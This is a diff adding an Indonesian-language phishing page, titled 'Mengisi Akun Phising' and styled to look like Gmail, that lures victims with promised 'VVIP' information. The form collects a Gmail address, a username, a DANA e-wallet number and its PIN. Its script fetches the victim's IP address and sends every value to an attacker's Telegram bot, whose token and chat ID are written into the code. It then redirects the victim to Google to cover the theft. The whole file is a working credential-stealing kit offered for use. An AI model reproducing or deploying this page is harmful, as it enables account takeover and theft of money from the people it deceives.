@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+
+<html lang="id">
+
+<head>
+
+<title>Mengisi Akun Phising</title>
+
+<style>
+
+body {
+
+background-color: #f1f1f1;
+
+font-family: Arial, sans-serif;
+
+animation: fadeIn 1s ease-in;
+
+}
+
+@keyframes fadeIn {
+
+from { opacity: 0; }
+
+to { opacity: 1; }
+
+}
+
+.container {
+
+width: 400px;
+
+margin: 100px auto;
+
+background-color: white;
+
+padding: 20px;
+
+border-radius: 8px;
+
+box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+
+animation: slideIn 1s ease-out;
+
+}
+
+@keyframes slideIn {
+
+from { transform: translateY(-50px); opacity: 0; }
+
+to { transform: translateY(0); opacity: 1; }
+
+}
+
+h1 {
+
+text-align: center;
+
+color: #db4437; /* Warna merah seperti Gmail */
+
+}
+
+input {
+
+width: 100%;
+
+padding: 10px;
+
+margin: 10px 0;
+
+border: 1px solid #ccc;
+
+border-radius: 4px;
+
+box-sizing: border-box;
+
+transition: border-color 0.3s;
+
+}
+
+input:focus {
+
+border-color: #4285f4; /* Warna biru saat fokus */
+
+animation: pulse 0.5s;
+
+}
+
+@keyframes pulse {
+
+0% { box-shadow: 0 0 0 rgba(66, 133, 244, 0); }
+
+50% { box-shadow: 0 0 10px rgba(66, 133, 244, 0.5); }
+
+100% { box-shadow: 0 0 0 rgba(66, 133, 244, 0); }
+
+}
+
+button {
+
+width: 100%;
+
+padding: 10px;
+
+background-color: #4285f4;
+
+color: white;
+
+border: none;
+
+border-radius: 4px;
+
+cursor: pointer;
+
+transition: background-color 0.3s;
+
+}
+
+button:hover {
+
+background-color: #357ae8;
+
+animation: bounce 0.5s;
+
+}
+
+@keyframes bounce {
+
+0%, 100% { transform: translateY(0); }
+
+50% { transform: translateY(-5px); }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h1>Masukkan Data Biar melanjutkan Informasi Vvip</h1>
+
+<form id="phishForm">
+
+<input type="email" placeholder="Email Gmail" id="email" required>
+
+<input type="text" placeholder="Username Anda" id="username" required>
+
+<input type="text" placeholder="Nomor DANA" id="danaNumber" required>
+
+<input type="password" placeholder="PIN DANA" id="danaPin" required>
+
+<button type="submit">Submit</button>
+
+</form>
+
+</div>
+
+<script>
+
+document.getElementById('phishForm').addEventListener('submit', function(e) {
+
+e.preventDefault();
+
+// Ambil IP address secara otomatis
+
+fetch('https://api.ipify.org?format=json')
+
+.then(response => response.json())
+
+.then(data => {
+
+const ip = data.ip;
+
+const email = document.getElementById('email').value;
+
+const username = document.getElementById('username').value;
+
+const danaNumber = document.getElementById('danaNumber').value;
+
+const danaPin = document.getElementById('danaPin').value;
+
+const token = '7485360440:AAGcPzGfxnZabE_9'; // Token bot Anda, sudah disisipkan
+
+const chatId = '828288888'; // User ID Telegram Anda, sudah disisipkan
+
+const message = `PHISING DANA\nIP address: ${ip}\nNomor DANA: ${danaNumber}\nPIN DANA: ${danaPin}\nEmail: ${email}\nUsername: ${username}\nPowered by MrAx`;
+
+fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+
+method: 'POST',
+
+headers: { 'Content-Type': 'application/json' },
+
+body: JSON.stringify({ chat_id: chatId, text: message })
+
+})
+
+.then(() => {
+
+// Redirect setelah data terkirim
+
+window.location.href = 'https://www.google.com';
+
+});
+
+});
+
+});
+
+</script>
+
+</body>
+
+</html>
